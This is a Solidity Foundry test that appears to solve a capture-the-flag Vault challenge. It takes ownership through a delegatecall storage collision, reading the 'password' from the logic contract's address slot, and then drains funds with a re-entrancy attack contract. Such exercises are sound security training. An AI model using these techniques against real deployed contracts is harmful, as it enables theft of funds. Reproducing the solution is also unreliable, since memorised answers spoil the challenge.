// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/Hacker.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        //1. open withdraw
        //call changeOwner via delegatecall
        bytes32 password = bytes32(uint256(uint160(address(logic))));
        bytes memory signatureSelectorChangeOwner = abi.encodeWithSignature("changeOwner(bytes32,address)", password, palyer);
        (bool success, ) = address(vault).call(signatureSelectorChangeOwner);
        require(success, "change owner failed");
        vault.openWithdraw();



        //2. starting re-entrancy attack
        Hacker hacker = new Hacker(address(vault));
        address(hacker).call{value: 0.2 ether}("");
        hacker.hack();
        

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
